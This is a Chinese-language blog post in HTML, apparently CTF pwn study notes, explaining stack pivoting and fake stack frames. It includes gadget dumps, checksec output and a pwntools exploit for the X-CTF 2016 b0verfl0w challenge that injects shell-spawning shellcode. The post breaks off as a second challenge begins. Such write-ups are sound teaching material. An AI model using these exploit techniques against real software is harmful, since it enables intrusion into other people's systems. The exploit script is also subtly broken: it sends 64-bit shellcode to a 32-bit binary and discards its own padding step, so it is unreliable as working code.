@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Hexrotor">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://hexrotor.github.io/2023/04/24/stackoverflow-tips/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="本文是本人跟着ctf-wiki上学之后做的笔记，写得比较详细">
+<meta property="og:type" content="article">
+<meta property="og:title" content="花式栈溢出">
+<meta property="og:url" content="https://hexrotor.github.io/2023/04/24/stackoverflow-tips/index.html">
+<meta property="og:site_name" content="Hexrotor的博客">
+<meta property="og:description" content="本文是本人跟着ctf-wiki上学之后做的笔记，写得比较详细">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-24T12:37:48.000Z">
+<meta property="article:modified_time" content="2024-10-23T14:07:49.261Z">
+<meta property="article:author" content="Hexrotor">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.svg">
+    <meta name="theme-color" content="#377ea8">
+    <link rel="shortcut icon" href="/images/favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            花式栈溢出 -
+        
+        沐源の记事本
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <!-- require APlayer --><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script data-swup-reload-script src="https://fastly.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+                
+    
+            
+                
+                    <!-- require MetingJS --><script data-swup-reload-script src="https://fastly.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+                
+    
+            
+                
+                    <!-- live 2D --><script data-swup-reload-script src="https://fastly.jsdelivr.net/gh/Hexrotor/live2d-widget@latest/autoload.js"></script>
+                
+    
+            
+                
+                    <!-- firework --><script data-swup-reload-script src="/js/plugins/fireworks.js"></script>
+                
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"hexrotor.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":["Hex"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":"Consolas, 'Liberation Mono', Menlo, 'Microsoft YaHei'","url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#377ea8","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/view_light.avif","dark":"https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/girl_dark.avif"},"title":"Welcome here!","subtitle":{"text":["HexrotorのBlog","沐源の记事本"],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Hexrotor","instagram":null,"zhihu":null,"twitter":null,"email":"ts_studio@foxmail.com","bilibili":"https://space.bilibili.com/37856989/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.4.4","navbar":{"auto_hide":true,"color":{"left":"#5c321491","right":"#1b668380","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about/","Github":"https://github.com/Hexrotor/blogsrc","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/12/15 09:42:26"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="https://hexrotor.github.io/">
+                
+                沐源の记事本
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags/"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-tags"></i>
+                                        
+                                        标签
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-folder"></i>
+                                        
+                                        分类
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about/">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/Hexrotor/blogsrc">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a href="/links/">友情链接
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags/"  >
+                             
+                                
+                                    <i class="fa-solid fa-tags"></i>
+                                
+                                标签
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-solid fa-folder"></i>
+                                
+                                分类
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about/">ME</a>
+                            </li>
+                        
+                            <li class="text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/Hexrotor/blogsrc">GITHUB</a>
+                            </li>
+                        
+                            <li class="text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/links/">友情链接</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">花式栈溢出</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://avatars.githubusercontent.com/u/45112661">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Hexrotor</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-04-24 20:37:48</span>
+        <span class="mobile">2023-04-24 20:37:48</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-10-23 22:07:49</span>
+            <span class="mobile">2024-10-23 22:07:49</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.9k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>13 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <p>本文是本人跟着ctf-wiki上学之后做的笔记，写得比较详细</p>
+<h3 id="栈转移"><a href="#栈转移" class="headerlink" title="栈转移"></a>栈转移</h3><p>栈转移是指劫持<code>SP</code>指针到我们能控制的位置，以便实现一些之前不方便的操作</p>
+<p>一般来说需要使用该技巧的情况有：</p>
+<ul>
+<li>可控的栈溢出字节数较少，难以构造长 payload 进行 rop</li>
+<li>有PIE地址随机化，栈地址未知。可以通过劫持转移栈到已知地址</li>
+<li>其他漏洞难利用，转换后更方便，比如把栈转移到堆空间后写rop</li>
+</ul>
+<p>要求有：</p>
+<ul>
+<li>可控程序执行流</li>
+<li>可控<code>SP</code>指针</li>
+</ul>
+<p>一般来说控制<code>SP</code>指针用<code>pop rsp/esp</code></p>
+<p><code>__libc_csu_init</code>中就有这种gadgets，但要使用偏移</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/7i <span class="number">0x000000000040061a</span></span><br><span class="line"><span class="number">0x40061a</span> &lt;__libc_csu_init+<span class="number">90</span>&gt;:  pop    rbx</span><br><span class="line"><span class="number">0x40061b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;:  pop    rbp</span><br><span class="line"><span class="number">0x40061c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;:  pop    r12</span><br><span class="line"><span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:  pop    r13</span><br><span class="line"><span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:  pop    r14</span><br><span class="line"><span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:  pop    r15</span><br><span class="line"><span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;: ret    </span><br><span class="line">gef➤  x/7i <span class="number">0x000000000040061d</span></span><br><span class="line"><span class="number">0x40061d</span> &lt;__libc_csu_init+<span class="number">93</span>&gt;:  pop    rsp  <span class="comment"># 原本pop r12</span></span><br><span class="line"><span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:  pop    r13</span><br><span class="line"><span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:  pop    r14</span><br><span class="line"><span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:  pop    r15</span><br><span class="line"><span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;: ret</span><br></pre></td></tr></table></figure></div>
+
+<p>此外，还有更加高级的 fake frame，要求有一段可以控制内容的内存，一般是如下：</p>
+<ul>
+<li>bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li>
+<li>heap。但是这个需要我们能够泄露堆地址。</li>
+</ul>
+<h4 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec: 什么都没开</span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
+
+<p>IDA反编译：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+18h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>); # 读<span class="number">50</span>个字符，不好构造长payload</span><br><span class="line">  <span class="title function_">printf</span><span class="params">(<span class="string">&quot;Hello %s.&quot;</span>, &amp;s)</span>;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这题的思路是在栈上填入短<code>shellcode</code>，然后想办法<code>jmp esp</code>，<code>EIP</code>就会跳到栈上。我们提前在栈上填入机器码处理<code>esp</code>，使<code>esp</code>指向<code>shellcode</code>后再次<code>jmp esp</code></p>
+<p>构造的payload结构如下：</p>
+<p><code>shellcode|padding|ebp|jmp_esp_addr|asm(&quot;sub esp, 0x?;jmp esp&quot;)</code></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 jmp esp</span></span><br><span class="line">$ ROPgadget --binary b0verfl0w --only <span class="string">&quot;jmp&quot;</span>|grep esp</span><br><span class="line">0x08048504 : jmp esp</span><br></pre></td></tr></table></figure></div>
+
+<p>执行<code>sub esp</code>时<code>ESP</code>到shellcode的距离可以通过看payload长度计算出来</p>
+<p>首先<code>shellcode+padding</code>是0x20</p>
+<p><code>ebp</code>0x4</p>
+<p><code>jmp_esp_addr</code> 0x4</p>
+<p>我们需要设置<code>esp</code>到<code>shellcode</code>，而此时<code>esp</code>在<code>jmp_esp_addr</code>的后面指向asm，所以需要对<code>esp</code> - 0x28</p>
+<p>exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">shellcode.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 填充shellcode长度</span></span><br><span class="line">sub_esp_jmp_esp = asm(<span class="string">&quot;sub esp, 0x28;jmp esp&quot;</span>) <span class="comment">#生成机器码</span></span><br><span class="line">jmp_esp_addr = <span class="number">0x08048504</span></span><br><span class="line">payload = flat([shellcode, <span class="string">&quot;bbbb&quot;</span>, jmp_esp_addr, sub_esp_jmp_esp])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="frame-faking-栈伪造"><a href="#frame-faking-栈伪造" class="headerlink" title="frame faking(栈伪造)"></a>frame faking(栈伪造)</h3><p>构建一个虚假的栈帧来控制程序的执行流。我们需要同时控制<code>IP</code>和<code>BP</code>寄存器，这样我们就能在控制程序执行流的同时也改变栈帧的位置</p>
+<p>以下内容基于x86架构</p>
+<p>这种攻击方式payload的格式一般如下：<code>buffer padding|fake ebp|leave_ret_addr|</code>其中<code>fake ebp</code>为我们构造的假栈帧的基址。注意这里多了<code>leave</code>指令</p>
+<p>回顾<code>leave</code>指令的等效用法：<code>mov esp, ebp; pop ebp</code> 在执行此命令之前，<code>EBP</code>指向栈中saved ebp</p>
+<p>执行后，<code>EBP</code>回到主调函数位置，<code>ESP</code>指向retaddr</p>
+<p>而<code>ret</code>指令实际上等效于<code>pop eip</code>，执行后<code>ESP</code>完全回到主调函数的原位置</p>
+<p>上面提到的payload中，<code>retaddr</code>被覆盖为<code>leave_ret_addr</code>，这导致程序ret后会再次执行<code>leave</code> <code>ret</code></p>
+<p>接下来的描述有点绕，在这里先明确一些代号：</p>
+<ul>
+<li><code>ebp2</code>是一个值，这个值是一个内存地址，是我们最终想赋给寄存器<code>EBP</code>的值(使<code>EBP</code>指向这个地址)</li>
+<li><code>ebp2_addr</code>是一个值，这个值是一个内存地址，该处内存保存着<code>ebp2</code>的值</li>
+</ul>
+<p>假栈帧大致格式：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+---------------------+</span><br><span class="line">| arg2 of function    | 高地址</span><br><span class="line">+---------------------+</span><br><span class="line">| arg1 of function    |</span><br><span class="line">+---------------------+</span><br><span class="line">| leave_ret_addr      |</span><br><span class="line">+---------------------+</span><br><span class="line">| target function addr|</span><br><span class="line">+---------------------+</span><br><span class="line">| ebp2                |</span><br><span class="line">+---------------------+ &lt;- ebp2_addr</span><br></pre></td></tr></table></figure></div>
+
+<p>payload的<code>fake ebp</code> 就是 <code>ebp2_addr</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buffer padding|fake ebp|leave_ret_addr|</span><br><span class="line">buffer padding|ebp2_addr|leave_ret_addr|</span><br></pre></td></tr></table></figure></div>
+
+<p>利用此payload，我们可以依次做以下事情：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">leave:</span><br><span class="line">	mov esp, ebp</span><br><span class="line">	pop ebp # 使ebp变为ebp2_addr</span><br><span class="line"></span><br><span class="line">ret # run leave ret again</span><br><span class="line"></span><br><span class="line">leave:</span><br><span class="line">	mov esp, ebp # 使esp也变为ebp2_addr，这让esp指向了ebp2_addr</span><br><span class="line">	pop ebp # 此时esp指向ebp2_addr，此操作会将该处内存的ebp2值赋给ebp</span><br><span class="line"></span><br><span class="line">ret # return to target function 需要提前在ebp2_addr+4处写入target function addr</span><br><span class="line"></span><br><span class="line"># after target function, return to leave_ret_addr</span><br><span class="line"># 然后程序又会执行类似的操作。如果我们在ebp2指向的地址处也设置好了相应内容，就能继续劫持ebp+eip</span><br><span class="line"># 当然，如果假栈帧能控制的大小足够长，我们也可以直接像以前一样构造纯粹的rop，不再借助leave ret</span><br><span class="line"># 即假栈帧的结构为:</span><br><span class="line"></span><br><span class="line">+---------------------+</span><br><span class="line">| ...                 | 高地址</span><br><span class="line">+---------------------+</span><br><span class="line">| next_retaddr        |</span><br><span class="line">+---------------------+</span><br><span class="line">| arg2                |</span><br><span class="line">+---------------------+</span><br><span class="line">| arg1                |</span><br><span class="line">+---------------------+</span><br><span class="line">| pop_xxx_pop_xxx_ret |</span><br><span class="line">+---------------------+</span><br><span class="line">| target function addr|</span><br><span class="line">+---------------------+</span><br><span class="line">| ebp2                | </span><br><span class="line">+---------------------+ &lt;- ebp2_addr</span><br></pre></td></tr></table></figure></div>
+
+
+<h4 id="2018-安恒杯-over-over"><a href="#2018-安恒杯-over-over" class="headerlink" title="2018 安恒杯 over.over"></a>2018 安恒杯 over.over</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped</span><br><span class="line">[*] &#x27;/home/m4x/pwn_repo/others_over/over.over&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure></div>
+
